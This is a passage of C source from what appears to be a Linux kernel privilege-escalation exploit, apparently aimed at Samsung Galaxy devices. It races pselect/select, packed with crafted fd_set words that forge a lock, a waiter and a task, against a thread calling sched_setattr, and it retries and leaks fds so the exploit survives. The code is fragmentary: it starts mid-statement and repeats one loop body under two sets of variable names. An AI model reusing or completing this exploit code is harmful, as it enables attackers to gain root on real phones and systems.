          (unsigned long long)fdset_get_word(&ex, 3));

  /* The route may replace low fds, including stdout and stderr. */
  reserve_standard_io();
  open_selected_fds(&in, &out, &ex, high_read, pipefd[1]);
  close(high_read);

  atomic_store(&legacy_consumer_calls, 0);
  atomic_store(&legacy_consumer_success, 0);
  atomic_store(&legacy_consumer_stop, 0);
  int delay_usec = route_delay_usec(1);
  atomic_store(&legacy_route_delay_usec, delay_usec);
  atomic_store(&legacy_consumer_go, 1);

  pr_info("pselect pre-select compact=%d +%.0fms\n", compact_route,
          fops_elapsed_ms(&route_t0));
  errno = 0;
  int ret;
  if (compact_route) {
    uint32_t timeout_us = execution->select_timeout_us;
    struct timespec ts = {
      .tv_sec = timeout_us / 1000000,
      .tv_nsec = (long)(timeout_us % 1000000) * 1000,
    };
    ret = pselect(PSELECT_ROUTE_NFDS, &in, &out, &ex, &ts, NULL);
  } else {
    /* 6.6: select() with a {0, 200ms} timeout. */
    uint32_t timeout_us = execution->select_timeout_us;
    struct timeval timeout = {
      .tv_sec = timeout_us / 1000000,
      .tv_usec = timeout_us % 1000000,
    };
    ret = select(PSELECT_ROUTE_NFDS, &in, &out, &ex, &timeout);
  }
  int saved_errno = errno;
  restore_standard_io();
  pr_info("pselect post-select compact=%d +%.0fms ret=%d\n", compact_route,
          fops_elapsed_ms(&route_t0), ret);
  atomic_store(&legacy_consumer_go, 0);

  /* Root-My-Galaxy slide_pselect_stack_copy: when the consumer entered sched_setattr,
   * wait for it to finish before tearing the fds down. The PI walk runs on
   * the consumer's CPU and we must not close/reclaim the block fds while it
   * still holds the crafted waiter on the stack. */
  int consumer_stuck = 0;
  if (atomic_load(&legacy_consumer_inflight) != 0) {
    for (int i = 0; i < 2000 && atomic_load(&legacy_consumer_inflight) != 0; i++) {
      usleep(1000);
    }
    consumer_stuck = atomic_load(&legacy_consumer_inflight) != 0;
  }

  calls = atomic_load(&legacy_consumer_calls);
  success = atomic_load(&legacy_consumer_success);
  pr_info("pselect returned ret=%d errno=%d calls=%d success=%d delay=%d\n",
          ret, saved_errno, calls, success, delay_usec);

    fd_set in;
    fd_set out;
    fd_set ex;
    prepare_pselect_fdsets(&in, &out, &ex);
    pr_info("pselect route setup attempt=%d/%d shift=%d page=%016zx "
            "fake_lock=%016zx fake_w0=%016zx fake_task=%016zx "
            "in0=%016llx in3=%016llx out0=%016llx ex0=%016llx "
            "ex1=%016llx ex2=%016llx ex3=%016llx\n",
            attempt, attempts, pselect_waiter_shift(),
            page_base, fake_lock, fake_w0, fake_task,
            (unsigned long long)fdset_get_word(&in, 0),
            (unsigned long long)fdset_get_word(&in, 3),
            (unsigned long long)fdset_get_word(&out, 0),
            (unsigned long long)fdset_get_word(&ex, 0),
            (unsigned long long)fdset_get_word(&ex, 1),
            (unsigned long long)fdset_get_word(&ex, 2),
            (unsigned long long)fdset_get_word(&ex, 3));
    log_sync();

    /* The route may replace low fds, including stdout and stderr. */
    reserve_standard_io();
    open_selected_fds(&in, &out, &ex, high_read, pipefd[1]);
    close(high_read);

    atomic_store(&consumer_calls, 0);
    atomic_store(&consumer_success, 0);
    atomic_store(&punch_consume_stop, 0);
    int delay_usec = route_delay_usec(attempt);
    atomic_store(&main_route_delay_usec, delay_usec);
    atomic_store(&punch_consume_go, attempt);

    pr_info("pselect pre-select attempt=%d/%d compact=%d +%.0fms\n",
            attempt, attempts, compact_route, fops_elapsed_ms(&route_t0));
    errno = 0;
    int ret;
    if (compact_route) {
      struct timespec ts = {
        .tv_sec = compact_timeout_sec,
        .tv_nsec = compact_timeout_usec * 1000,
      };
      ret = pselect(PSELECT_ROUTE_NFDS, &in, &out, &ex, &ts, NULL);
    } else {
      /* non-compact stays on select with its 200ms timeout */
      struct timeval timeout = {
        .tv_sec = PSELECT_TIMEOUT_SEC,
#ifdef PSELECT_TIMEOUT_USEC
        .tv_usec = PSELECT_TIMEOUT_USEC,
#else
        .tv_usec = 0,
#endif
      };
      ret = select(PSELECT_ROUTE_NFDS, &in, &out, &ex, &timeout);
    }
    int saved_errno = errno;
    restore_standard_io();
    pr_info("pselect post-select attempt=%d/%d compact=%d +%.0fms ret=%d\n",
            attempt, attempts, compact_route, fops_elapsed_ms(&route_t0), ret);
    atomic_store(&punch_consume_go, 0);

    /* RMGP pattern, wait out the consumer before closing the fds. The PI walk
     * runs on its CPU with the crafted waiter on the stack */
    int consumer_stuck = 0;
    if (atomic_load(&consumer_inflight) != 0) {
      for (int i = 0; i < 2000 && atomic_load(&consumer_inflight) != 0; i++) {
        usleep(1000);
      }
      consumer_stuck = atomic_load(&consumer_inflight) != 0;
    }

    calls = atomic_load(&consumer_calls);
    success = atomic_load(&consumer_success);
    pr_info("pselect returned attempt=%d/%d ret=%d errno=%d calls=%d "
            "success=%d delay=%d\n",
            attempt, attempts, ret, saved_errno, calls, success, delay_usec);

    if (calls > 0 && success > 0) {
      route_last_step = 0;
      route_last_errno = 0;
      winner = 1;
    } else {
      route_last_step = 33;
      route_last_errno = saved_errno;
    }

    /* open_selected_fds only closes its own F_DUPFD copy */
    if (consumer_stuck) {
      /* stuck in sched_setattr or futex, closing would reclaim objects its
       * syscall still uses, leak and let process exit reclaim them */
      route_last_step = 34;
      pr_warning("pselect consumer still inflight, leaking route fds\n");
      leak_fds = 1;
      break;
    }
    if (block_fd != pipefd[0]) {
      close(block_fd);
    }

    if (winner) {
      break;
    }
  }

  if (!leak_fds) {
    close(pipefd[0]);
    close(pipefd[1]);
  }

  pr_info("pselect route done calls=%d success=%d step=%d errno=%d\n",
          calls, success, route_last_step, route_last_errno);
}
